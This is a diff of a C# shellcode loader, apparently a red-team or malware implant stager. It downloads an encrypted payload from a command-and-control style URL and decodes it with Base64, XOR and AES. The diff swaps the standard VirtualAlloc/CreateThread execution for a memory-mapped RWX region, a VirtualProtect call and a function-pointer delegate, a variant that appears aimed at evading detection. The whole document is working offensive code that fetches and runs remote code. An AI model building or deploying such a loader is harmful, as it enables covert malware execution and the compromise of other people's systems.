@@ -1,13 +1,15 @@
 ﻿using System;
 using System.Net;
 using System.Runtime.InteropServices;
+using System.IO.MemoryMappedFiles;
 using System.Text;
+using System.Threading;
 
 namespace ShellcodeLoader
 {
     public class Loader
     {
-        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+/*        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
         static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
 
         [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
@@ -27,13 +29,16 @@ namespace ShellcodeLoader
         public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
 
         [DllImport("kernel32.dll")]
-        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);
+        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);*/
 
-        [DllImport("kernel32.dll")]
-        public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, MemoryProtection flNewProtect, out MemoryProtection lpflOldProtect);
+        [DllImport("Kernel32.dll")]
+        public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
 
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        delegate void MyFunction();
+/*
         [DllImport("kernel32.dll")]
-        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);*/
 
         [DllImport("bcrypt.dll")]
         public static extern uint BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm, [MarshalAs(UnmanagedType.LPWStr)] string pszAlgId, [MarshalAs(UnmanagedType.LPWStr)] string pszImplementation, uint dwFlags);
@@ -95,14 +100,14 @@ namespace ShellcodeLoader
             using (var client = new WebClient())
             {
                 // Download the shellcode
-                shellcode = client.DownloadData("http://192.168.56.1:8081/agents/windows/cs");
+                shellcode = client.DownloadData("http://localhost:8081/agents/windows/cs");
             }
 
             // Base64 decoding
             shellcode = Convert.FromBase64String(Encoding.UTF8.GetString(shellcode));
 
             // XOR decryption
-			var xorKey = Convert.FromBase64String("/6JQOK0mVvckHAUXuGVmVWpv3bghxwkdG5vZVXKJz0k="); // XOR key
+			var xorKey = Convert.FromBase64String("#1"); // XOR key
             shellcode = XORDecrypt(shellcode, xorKey);
 
             // AES decryption process
@@ -116,13 +121,13 @@ namespace ShellcodeLoader
             if (ntStatus != 0)
                 throw new Exception("BCryptSetProperty failed with status " + ntStatus);
 
-			var key = Convert.FromBase64String("ALygtcTq8av/RHunfsunlnPgKvlOKlyD2SMU+q3xcN0="); // AES-256 key
+			var key = Convert.FromBase64String("#2"); // AES-256 key
             var hKey = IntPtr.Zero;
             ntStatus = BCryptGenerateSymmetricKey(hAlgorithm, out hKey, IntPtr.Zero, 0, key, (uint)key.Length, 0);
             if (ntStatus != 0)
                 throw new Exception("BCryptGenerateSymmetricKey failed with status " + ntStatus);
 
-			var iv = Convert.FromBase64String("xBRBUynh4re1tqAaj9DMQg=="); // AES IV
+			var iv = Convert.FromBase64String("#3"); // AES IV
             var decryptedShellcode = new byte[shellcode.Length];
             uint decryptedShellcodeSize;
             ntStatus = BCryptDecrypt(hKey, shellcode, (uint)shellcode.Length, IntPtr.Zero, iv, (uint)iv.Length, decryptedShellcode, (uint)shellcode.Length, out decryptedShellcodeSize, 0);
@@ -139,7 +144,7 @@ namespace ShellcodeLoader
 
             byte[] shellcode = getterShellcode();
 
-            var baseAddress = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ReadWrite);
+            /*var baseAddress = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ReadWrite);
 
             // Copy the shellcode into the memory region
             Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);
@@ -154,7 +159,33 @@ namespace ShellcodeLoader
 
 
             // Wait infinitely on this thread to stop the process exiting
-            WaitForSingleObject(hThread, 0xFFFFFFFF);
+            WaitForSingleObject(hThread, 0xFFFFFFFF);*/
+
+            using (var mmf = MemoryMappedFile.CreateNew(null, shellcode.Length, MemoryMappedFileAccess.ReadWriteExecute))
+            {
+                using (var accessor = mmf.CreateViewAccessor(0, shellcode.Length, MemoryMappedFileAccess.ReadWriteExecute))
+                {
+                    IntPtr pointer = accessor.SafeMemoryMappedViewHandle.DangerousGetHandle();
+                    Marshal.Copy(shellcode, 0, pointer, shellcode.Length);
+                }
+
+                using (var accessor = mmf.CreateViewAccessor(0, 0, MemoryMappedFileAccess.ReadWriteExecute))
+                {
+                    IntPtr pointer = accessor.SafeMemoryMappedViewHandle.DangerousGetHandle();
+                    uint oldProtect;
+
+                    if (!VirtualProtect(pointer, (uint)shellcode.Length, 0x40, out oldProtect)) //PAGE_EXECUTE_READWRITE
+                    {
+                        Console.WriteLine("[!] VirtualProtect Failed");
+                        return;
+                    }
+
+                    var functionDelegate = (MyFunction)Marshal.GetDelegateForFunctionPointer(pointer, typeof(MyFunction));
+                    Thread functionThread = new Thread(() => functionDelegate()) { IsBackground = true };
+                    functionThread.Start();
+                    functionThread.Join();
+                }
+            }
 
         }
     }
